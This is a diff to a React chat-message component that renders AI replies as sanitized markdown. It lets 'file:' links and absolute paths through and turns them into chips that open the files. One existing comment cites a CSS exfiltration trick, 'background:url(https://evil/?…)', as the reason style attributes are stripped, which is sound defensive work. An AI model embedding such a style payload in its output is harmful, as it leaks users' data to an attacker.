@@ -1,6 +1,6 @@
 "use client";
 
-import { useState } from "react";
+import { useMemo, useState, type KeyboardEvent, type ReactNode } from "react";
 import { ConversationMessage as Message, ToolCall, SectionType } from "@/lib/types";
 import { thinkingTail } from "@/lib/conversation-activity";
 import { Brain, Wrench, User, Loader2, ArrowUpToLine, Plus, AlertTriangle } from "lucide-react";
@@ -15,7 +15,7 @@ import {
   AlertDialogHeader,
   AlertDialogTitle,
 } from "@/components/ui/alert-dialog";
-import ReactMarkdown from "react-markdown";
+import ReactMarkdown, { defaultUrlTransform, type Components } from "react-markdown";
 import rehypeRaw from "rehype-raw";
 import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
 import remarkGfm from "remark-gfm";
@@ -28,8 +28,14 @@ import DOMPurify from "isomorphic-dompurify";
 // AI output exfil data via `background:url(https://evil/?…)` or do CSS clickjacking,
 // and rehype-sanitize does not URL-sanitize inside style values. Tailwind utility
 // classes via className are enough for the formatting we actually need.
+// `file:` hrefs survive so the `a` renderer can turn them into artifact chips;
+// they never navigate — the chip opens them through the card-scoped route.
 const markdownSanitizeSchema = {
   ...defaultSchema,
+  protocols: {
+    ...defaultSchema.protocols,
+    href: [...(defaultSchema.protocols?.href || []), "file"],
+  },
   attributes: {
     ...defaultSchema.attributes,
     span: [...(defaultSchema.attributes?.span || []), "className"],
@@ -39,6 +45,42 @@ const markdownSanitizeSchema = {
 };
 import { MentionData } from "@/lib/types";
 import { extractApplicableContent, hasApplyBlock } from "@/lib/apply-content";
+import { artifactBasename, artifactKind, fileUrlToPath, localPathFromText } from "@/lib/artifact-url";
+import { openArtifactChip } from "@/lib/open-path";
+import { useToast } from "@/hooks/use-toast";
+
+// react-markdown blanks unsafe URLs before our renderers see them; keep
+// `file:` so the `a` renderer can make it a chip.
+function urlTransform(url: string): string {
+  return /^file:\/\//i.test(url) ? url : defaultUrlTransform(url);
+}
+
+function localPathFromCode(children: ReactNode): string | null {
+  return typeof children === "string" ? localPathFromText(children) : null;
+}
+
+function ArtifactChip({ path, label, onOpen }: { path: string; label?: string; onOpen: (path: string) => void }) {
+  const open = () => onOpen(path);
+  const onKeyDown = (e: KeyboardEvent) => {
+    if (e.key === "Enter" || e.key === " ") {
+      e.preventDefault();
+      open();
+    }
+  };
+  return (
+    <span
+      role="button"
+      tabIndex={0}
+      title={path}
+      data-kind={artifactKind(path)}
+      className="mention artifact-mention"
+      onClick={open}
+      onKeyDown={onKeyDown}
+    >
+      {label || artifactBasename(path)}
+    </span>
+  );
+}
 
 // CSS class map for mention types
 const MENTION_CLASS: Record<string, string> = {
@@ -183,6 +225,27 @@ export function ConversationMessage({
   // Append found every block already on the card (IDE-334).
   const [nothingNew, setNothingNew] = useState(false);
   const [confirmReplace, setConfirmReplace] = useState(false);
+  const { toast } = useToast();
+
+  // File paths in a reply — `file://` links and backticked absolute paths —
+  // render as the same violet chips the card tabs use, and open the file.
+  const markdownComponents = useMemo<Components>(() => {
+    const onOpen = (path: string) => void openArtifactChip(cardId, path, toast);
+    return {
+      a: ({ href, children, node: _node, ...rest }) => {
+        const path = fileUrlToPath(href);
+        if (!path) return <a href={href} {...rest}>{children}</a>;
+        const text = typeof children === "string" ? children.trim() : "";
+        const label = !text || text.startsWith("/") || text.startsWith("file://") ? undefined : text;
+        return <ArtifactChip path={path} label={label} onOpen={onOpen} />;
+      },
+      code: ({ className, children, node: _node, ...rest }) => {
+        const path = className ? null : localPathFromCode(children);
+        if (path) return <ArtifactChip path={path} onOpen={onOpen} />;
+        return <code className={className} {...rest}>{children}</code>;
+      },
+    };
+  }, [cardId, toast]);
 
   // Show "Apply" button when: assistant message, not streaming, has content,
   // and either no persist tool was called or the reply still fences a proposal
@@ -278,6 +341,8 @@ export function ConversationMessage({
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         rehypePlugins={[rehypeRaw, [rehypeSanitize, markdownSanitizeSchema]]}
+        components={markdownComponents}
+        urlTransform={urlTransform}
       >
         {highlighted}
       </ReactMarkdown>
